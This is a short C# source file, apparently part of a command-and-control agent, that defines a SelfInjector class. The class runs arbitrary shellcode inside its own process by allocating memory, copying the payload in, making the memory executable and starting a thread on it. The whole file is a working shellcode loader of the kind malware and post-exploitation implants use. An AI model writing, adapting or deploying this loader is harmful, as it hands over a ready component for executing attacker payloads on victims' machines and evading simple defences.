using System;
using System.Runtime.InteropServices;

namespace Agent.Internal
{
    public class SelfInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            // alocate memory block
            var baseAddress = Native.Kernel32.VirtualAlloc(
                IntPtr.Zero,
                shellcode.Length,
                Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite
            );

            // copy into memory
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // execute block
            Native.Kernel32.VirtualProtect(
                baseAddress,
                shellcode.Length,
                Native.Kernel32.MemoryProtection.ExecuteRead, out _
            );

            Native.Kernel32.CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out var threadId);

            return threadId != IntPtr.Zero;
        }
    }
}
